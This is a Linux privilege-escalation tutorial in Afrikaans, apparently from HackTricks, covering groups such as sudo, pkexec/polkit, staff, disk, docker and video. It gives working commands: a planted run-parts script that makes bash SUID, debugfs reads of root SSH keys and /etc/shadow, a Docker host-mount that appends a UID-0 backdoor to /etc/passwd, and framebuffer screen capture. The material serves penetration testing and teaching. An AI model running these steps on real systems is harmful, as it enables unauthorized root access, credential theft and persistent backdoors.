# Interesting Groups - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin-groepe

### **PE - Metode 1**

**Soms** bevat ’n stelsel se **/etc/sudoers**-beleid (of ’n lêer wat daaruit ingesluit word) inskrywings soos:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Dit beteken dat enige gebruiker wat by enige van die inskrywings pas, enige opdrag as enige teikengebruiker deur `sudo` kan uitvoer (onderhewig aan die res van die beleid).<sup>[[3]](#references)</sup>

As dit die geval is, kan jy **om root te word eenvoudig die volgende uitvoer**:

```
sudo su
```

As `sudo -l` ’n beperkte `adduser`-aanroeping met slegs ’n gebruikersnaam toelaat, kyk of dit ’n primêre groep met dieselfde naam skep wat nog nie bestaan nie. ’n Nuwe rekening in daardie groep kan voorregte verkry as die effektiewe sudoers-beleid reeds aan `%group` voorregte toeken; verifieer beide die groep se skeppingsgedrag en die groepreël voordat jy dit as ’n eskalasiepad beskou. Die skep van ’n rekening verander die stelsel, dus moet jy eers die beleid nagaan.

### PE - Metode 2

Soek alle suid-binêre lêers en kyk of die Pkexec-binêre lêer teenwoordig is:

```bash
find / -perm -4000 2>/dev/null
```

As **pkexec 'n SUID-binêre lêer is**, kan dit 'n program as 'n ander gebruiker uitvoer slegs wanneer polkit die aangevraagde handeling magtig; die SUID-bit alleen waarborg nie root nie. Gaan die geïnstalleerde beleid en die teikensessie se magtiging na, eerder as om aan te neem dat lidmaatskap van **sudo** of **admin** voldoende is.<sup>[[4]](#references)[[5]](#references)</sup>

Vir die afsonderlike [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)-roete, verifieer eers dat `pkexec` 'n uitvoerbare **root-besitte SUID**-lêer is. 'n Geïnstalleerde binêre lêer sonder daardie bit is nie die plaaslike SUID-verhoging van voorregte wat in die advies beskryf word nie. 'n Weergawe-string van die stroomop-projek is slegs 'n leidraad: verspreidings kan die [regstelling na ouer pakketweergawes terugporteer](https://ubuntu.com/security/CVE-2021-4034), dus gaan die geïnstalleerde verskafferpakket en versagtingsmaatreëls na voordat jy dit kwesbaar noem.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) is 'n ander polkit-roete: 'n D-Bus-magtigingswedloop, nie 'n `pkexec` SUID-fout nie. Gaan die geïnstalleerde verskaffer se polkit-pakket na, asook of 'n bereikbare bevoorregte D-Bus-handeling 'n nuttige verandering kan aanbring; 'n roete vir die skep van rekeninge vereis ook 'n geskikte diens soos AccountsService, en enige nuwe groep se sudo-toegang hang af van die effektiewe sudo-beleid. 'n Gerapporteerde polkit-weergawe of geïnstalleerde diens is slegs 'n kandidaat, veral waar verskaffers [regstellings terugporteer](https://access.redhat.com/security/cve/cve-2021-3560). Passiewe enumerasie behoort nie die wedloop te aktiveer nie.

Op verspreidings wat steeds die ouer Local Authority-agtergrondstelsel gebruik, inspekteer die groepreëls daarvan met:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

Die relevante groepname en verstekwaardes verskil volgens verspreiding; ’n groep is hier slegs nuttig as die plaaslike beleid dit noem.<sup>[[5]](#references)</sup>

Om **root te word, kan jy uitvoer**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

As jy probeer om **pkexec** uit te voer en jy hierdie **fout** kry:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

In ’n SSH-sessie sonder ’n geregistreerde authentication agent kan `pkexec` met hierdie fout faal, selfs wanneer die beleid andersins die aksie sou toelaat; polkit dokumenteer `pkttyagent` as ’n teksgebaseerde authentication agent vir nie-rekenaarsessies. Die presiese gedrag hang af van die weergawe en verspreiding, dus moet jy die plaaslike beleid en agent-opstelling nagaan. ’n Oplossing wat vir geraakte NixOS-weergawes gerapporteer is, gebruik **2 verskillende SSH-sessies**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

’n ACL wat een rekening toegang tot `su` weier, beheer daardie uitvoerbare lêer, nie elke roete na ’n aksie waarvoor ’n administrateur gemagtig is nie. As ’n administrateur se geloofsbrief onafhanklik blootgelê is, moet jy nagaan of ’n afsonderlike aksie, soos die begin van ’n tydelike stelseldiens deur `systemd-run`, deur die effektiewe polkit-beleid toegelaat word, watter identiteit die authentication agent aanvaar, en watter identiteit die gevolglike diens sou gebruik. [Polkit onderskei tussen authentication as die sessie-eienaar en as ’n administrateur](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), terwyl [systemd-run ’n tydelike diens by die stelselbestuurder kan aanvra](https://systemd.io/CONTROL_GROUP_INTERFACE/). ’n Geskiedenisinskrywing, geïnstalleerde opdrag of leesbare beleidslêer bewys op sigself nie magtiging of geldigheid van geloofsbriewe nie; ’n passiewe hersiening behoort nie geloofsbriewe in te dien of ’n eenheid te begin nie.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Wheel-groep

Soms kan ’n sudoers-beleid ook hierdie inskrywing bevat:

```
%wheel	ALL=(ALL:ALL) ALL
```

Dit beteken dat enige gebruiker wat deur die inskrywing ooreenstem, enige opdrag as enige teikengebruiker via `sudo` kan uitvoer (onderhewig aan die res van die beleid).<sup>[[3]](#references)</sup>

As dit die geval is, kan jy **root word deur eenvoudig die volgende uit te voer**:

```
sudo su
```

## shadow-groep

Op stelsels waar die toestemmings dit toelaat, kan gebruikers in die **shadow**-groep **/etc/shadow** **lees**; verifieer die werklike modus en ACL's op die teiken:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Lees dus die lêer en probeer om **’n paar hashes te kraak**.

’n Belangrike nuanse oor slotstatus wanneer jy hashes triageer:
- Inskrywings met `!` of `*` is oor die algemeen nie-interaktief vir wagwoordaanmeldings nie.
- `!hash` beteken dat die wagwoord gesluit is; die oorblywende karakters verteenwoordig die wagwoordveld voordat dit gesluit is.
- ’n Veld wat `*` bevat, is nie ’n geldige `crypt(3)`-hash nie en verhoed UNIX-wagwoordaanmelding; moenie daaruit aflei of ’n wagwoord voorheen gestel is nie.
Dit is nuttig om rekeninge te klassifiseer, selfs wanneer direkte aanmelding geblokkeer is.<sup>[[6]](#references)</sup>

## Staff-groep

**staff**: Laat gebruikers toe om plaaslike wysigings aan die stelsel (`/usr/local`) aan te bring sonder wortelvoorregte (let daarop dat uitvoerbare lêers in `/usr/local/bin` in enige gebruiker se PATH-veranderlike is, en dat hulle die uitvoerbare lêers in `/bin` en `/usr/bin` met dieselfde naam kan "oorheers"). Vergelyk met die groep "adm", wat meer met monitering/sekuriteit verband hou.<sup>[[2]](#references)[[7]](#references)</sup>

Op Debian-konfigurasies waar `/usr/local/bin` voor `/usr/bin` in `PATH` verskyn (soos in die voorbeelde hieronder), sal ’n opdrag sonder ’n pad die kopie in `/usr/local/bin` eerste uitvoer; bevestig die effektiewe `PATH` op die teiken.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

As ’n bevoorregte proses ’n ongekwalifiseerde opdrag deur ’n skryfbare `/usr/local/bin` oplos, kan die vervanging van daardie opdrag dit met die proses se voorregte laat uitvoer; bevestig die werklike pad en sneller voordat jy toets.

Op Ubuntu-stelsels voer `pam_motd` by aanmelding uitvoerbare skrifte via `run-parts --lsbsysinit` as root uit; cron-take kan ook `run-parts` gebruik, maar dit is verspreidings- en konfigurasiespesifiek.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

Met ’n nuwe SSH-aanmelding kan `pspy` help bevestig of hierdie pad werklik op die teiken aangeroep word; dit kan proses-opdragreëls sonder root waarneem.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Disk-groep

Lidmaatskap van die **disk**-groep kan rou toegang tot bloktoestelle verleen en is dikwels **naby aan root access**; Debian beskryf dit as grootliks gelykstaande aan root, maar verifieer die werklike toestemmings vir toestelle en die berginguitleg op die teiken.<sup>[[7]](#references)</sup>

Algemene toestelpaadjies sluit `/dev/sd*` in, maar NVMe en ander berginguitlegte gebruik verskillende name.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` werk op ext2/ext3/ext4-lêerstelsels; paaie soos `/root` en `/etc/shadow` hierbo is lêers binne die oopgemaakte lêerstelsel, terwyl die tweede argument vir `dump` ’n uitvoerpad op die gasheer se lêerstelsel is.<sup>[[8]](#references)</sup> Byvoorbeeld, dit haal `/tmp/asd1.txt` uit die oopgemaakte lêerstelsel en skryf dit na `/tmp/asd2.txt` op die gasheer se lêerstelsel:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

Die `-w`-opsie maak die lêerstelsel vir lees en skryf oop, en die `write`-opdrag kopieer ’n lêer vanaf die gasheerstelsel na die oopgemaakte lêerstelsel. Vermy gebruik daarvan op ’n gemonteerde, aktiewe lêerstelsel, aangesien direkte wysigings die lêerstelsel kan beskadig; werk indien moontlik vanaf ’n vanlyn beeld.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Video-groep

Met die opdrag `w` kan jy vind **wie by die stelsel aangemeld is**, en dit sal uitvoer soos die volgende een wys.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

Die **tty1**-inskrywing identifiseer die eerste Linux-virtuele konsole; dit bewys nie op sigself dat ’n gebruiker fisies by die masjien teenwoordig is nie, veral in houers of ander omgewings.<sup>[[21]](#references)</sup>

Op stelsels wat ’n leesbare framebuffer-toestel beskikbaar stel, kan lidmaatskap van die **video**-groep toegang tot daardie toestel verleen. Die Linux-framebuffer-koppelvlak dokumenteer `/dev/fb0` as ’n leesbare geheuetoestel waarvan die inhoud gekopieer kan word om ’n skermskoot te neem; die pad `/sys/class/graphics/fb0/virtual_size` is slegs beskikbaar waar daardie fbdev-sysfs-kenmerk teenwoordig is, dus moet jy dit eers op die teiken nagaan.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

As die geïnstalleerde **GIMP**-weergawe ’n invoerder vir rou data bied, maak **`screen.raw`** daarmee oop; ondersteuning en kontroles wissel na gelang van die weergawe en inprop.<sup>[[22]](#references)</sup>

![Skyfgroep - Videogroep: Om die rou beeld oop te maak, kan jy GIMP gebruik. Kies die screen.raw-lêer en kies Raw image data as lêertipe](<../../../images/image (463).png>)

Stel die beeld se breedte en hoogte in om by die framebuffer-geometrie te pas; probeer die beskikbare pixel-formate/beeldtipes totdat die uitvoer leesbaar is.<sup>[[9]](#references)</sup>

![Skyfgroep - Videogroep: Verander dan die breedte en hoogte na dié wat op die skerm gebruik word en toets verskillende beeldtipes (en kies die een wat die skerm die beste vertoon)](<../../../images/image (317).png>)

## Root-groep

Lidmaatskap van die **root**-groep gee nie jou root se UID nie, maar lêers wat deur die groep geskryf kan word en aan `root` behoort, kan steeds interessant wees wanneer bevoorregte dienste of biblioteke dit gebruik. Kontroleer die lêer se werklike toestemmings en hoe dit gebruik word voordat jy dit as ’n roete vir voorregte-eskalasie beskou.

**Kontroleer watter lêers root-lede kan wysig**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker-groep

Lidmaatskap van die `docker`-groep verleen toegang op root-vlak tot die Docker-daemon op standaard rootful-installasies. Omdat bind mounts by verstek lees-en-skryf is, kan ’n gebruiker wat daardie daemon beheer, die host se `/` in ’n container mount en host-lêers verander; dit gee die gebruiker effektief root op die host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

Groep-lidmaatskap kan nie ooreenstem tussen `/etc/group`, `/etc/gshadow` en die huidige proses-token nie. As ’n gebruiker nie in `id -nG` verskyn nie, maar `newgrp docker` slaag, kyk na die groep wat `id` in die nuwe shell wys en toets of die Docker-socket werklik skryfbaar is en ’n rootful-daemon bedien. Die groepnaam alleen bevestig nie beheer oor die host nie. Beperk enige outomatiese `newgrp`-toets sodat ’n wagwoordprompt nie die enumerasie kan laat vashaak nie.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Ten slotte, as jy nie van enige van die vorige voorstelle hou nie, of hulle om een of ander rede nie werk nie (docker API-firewall?), kan jy altyd probeer om **’n bevoorregte container te laat loop en daaruit te ontsnap**, soos hier verduidelik:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

As jy skryftoestemmings op die docker-soket het, lees [**hierdie plasing oor hoe om voorregte te eskaleer deur die docker-soket te misbruik**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd-groep

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Adm-groep

Gewoonlik het **lede** van die **`adm`**-groep toestemming om loglêers in _/var/log/_ te **lees**.\  
As jy dus ’n gebruiker in hierdie groep gekompromitteer het, moet jy beslis **na die logs kyk**.<sup>[[7]](#references)</sup>

## Backup- / Operator- / lp- / Mail-groepe

Hierdie groepe het diens- en verspreidingspesifieke betekenisse. Debian dokumenteer `backup` vir gedelegeerde rugsteun/herstel, `lp` vir drukkerdaemone en `mail` vir `/var/mail`; gaan dus plaaslike toestemmings na voordat jy groeplidmaatskap as ’n voorregroete beskou.<sup>[[7]](#references)</sup>

Hulle is dikwels **geloofsbrondiscovery**-vektore eerder as direkte root-vektore:
- **backup**: kan argiewe blootlê wat konfigurasies, sleutels, DB-dumps of tokens bevat.
- **operator**: platformspesifieke operasionele toegang wat sensitiewe looptyddata kan uitlek.
- **lp**: drukkerstoue/spoele kan dokumentinhoud bevat.
- **mail**: e-posspoele kan skakels vir wagwoordterugstelling, OTP’s en interne geloofsbronne blootlê.

Beskou lidmaatskap hiervan as ’n bevinding met hoëwaarde-datablootstelling en volg die hergebruik van wagwoorde/tokens op.

## Auth-groep

Op OpenBSD, wanneer S/Key opgestel is, behoort `/etc/skey` aan `root:auth` en vereis toegang tot die rekords die `auth`-groep; YubiKey-rekords word in `/var/db/yubikey` gestoor.<sup>[[16]](#references)[[17]](#references)</sup> ’n Kwesbare OpenBSD 6.6-konfigurasie met S/Key of YubiKey geaktiveer het plaaslike gebruikers met `auth`-voorregte toegelaat om root te word; Qualys dokumenteer die voorvereiste en uitbuitingsketting, en die gekoppelde PoC implementeer dit.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [pkexec/pkttyagent-verifikasie sonder ’n GUI-sessie (NixOS-uitgawe #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [Stelselgroepe - Debian-wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian-manbladsye](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit-verwysingshandleiding](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit-verwysingshandleiding](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Debian-beveiligingshandleiding](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux-handleidingbladsy](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Die Frame Buffer-toestel — Linux-kerneldokumentasie](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu-manbladsye](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian-manbladsye](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — onvoorregte Linux-prosesmonitering](https://github.com/DominicBreuker/pspy)
- [13] [Docker Engine-sekuriteit](https://docs.docker.com/engine/security/)
- [14] [Bestuur Docker as ’n nie-root-gebruiker](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Laat containers loop — Docker-dokumentasie](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD-manbladsye](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD-manbladsye](https://man.openbsd.org/login_yubikey.8)
- [18] [Verifikasiekwesbaarhede in OpenBSD — Qualys-sekuriteitsadvies](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — plaaslike exploit-PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux-toegewysde toestelle (4.x+-weergawe)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Beeldinvoer en -uitvoer — GIMP-dokumentasie](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
